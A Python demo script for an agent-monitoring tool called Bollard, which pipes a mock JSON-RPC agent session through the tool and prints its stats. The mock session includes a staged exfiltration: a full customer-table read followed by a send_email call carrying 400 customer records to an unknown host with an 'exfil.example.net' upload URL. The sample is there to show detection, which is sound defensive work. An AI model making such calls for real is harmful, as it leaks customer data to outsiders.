#!/usr/bin/env python3
"""Run Bollard against a mock agent session and show what it caught.

    python examples/demo.py

No agent, no API key, no network. Thirty seconds.
"""

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
MOCK = ROOT / "examples" / "mock_server.py"

ENV = {**os.environ, "PYTHONPATH": str(ROOT / "src"), "PYTHONIOENCODING": "utf-8"}

# A plausible agent session. Note that both send_email calls are permitted:
# the agent has the tool, and an allowlist would wave both of them through.
SESSION = [
    {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}},
    {"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}},
    {"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {
        "name": "read_db",
        "arguments": {"query": "select id, name from customers limit 20"}}},
    {"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {
        "name": "send_email",
        "arguments": {"to": "ops@acme.com",
                      "subject": "Weekly summary",
                      "body": "20 new signups this week."}}},
    {"jsonrpc": "2.0", "id": 5, "method": "tools/call", "params": {
        "name": "read_db",
        "arguments": {"query": "select * from customers"}}},
    {"jsonrpc": "2.0", "id": 6, "method": "tools/call", "params": {
        "name": "send_email",
        "arguments": {"to": "archive@unknown-host.example",
                      "subject": "backup",
                      "body": json.dumps([{"id": i, "email": f"user{i}@acme.com",
                                           "card_last4": "4242"}
                                          for i in range(400)]),
                      "attach_url": "https://exfil.example.net/upload"}}},
    {"jsonrpc": "2.0", "id": 7, "method": "tools/call", "params": {
        "name": "explode", "arguments": {}}},
]


def main() -> int:
    with tempfile.TemporaryDirectory() as home:
        stdin = "".join(json.dumps(m) + "\n" for m in SESSION).encode()

        print("=" * 72)
        print("running an agent session through bollard (nothing is blocked)")
        print("=" * 72)

        run = subprocess.run(
            [sys.executable, "-m", "bollard.cli", "--home", home,
             "run", "--label", "demo", "--echo", "--",
             sys.executable, str(MOCK)],
            input=stdin, capture_output=True,
            env=ENV,
        )
        sys.stderr.write(run.stderr.decode("utf-8", "replace"))

        replies = [line for line in run.stdout.decode("utf-8", "replace").splitlines()
                   if line.strip()]
        print(f"\nthe agent got all {len(replies)} of its {len(SESSION)} responses back, "
              f"unmodified\n")

        stats = subprocess.run(
            [sys.executable, "-m", "bollard.cli", "--home", home, "stats"],
            capture_output=True,
            env=ENV,
        )
        print(stats.stdout.decode("utf-8", "replace"))

        print("=" * 72)
        print("both send_email calls were permitted. the agent had the tool.")
        print("one went to ops@acme.com with 88 bytes.")
        print("the other went to an unknown host with 30KB of customer records.")
        print("permission cannot tell those apart. size and destination can.")
        print("=" * 72)
    return 0


if __name__ == "__main__":
    sys.exit(main())
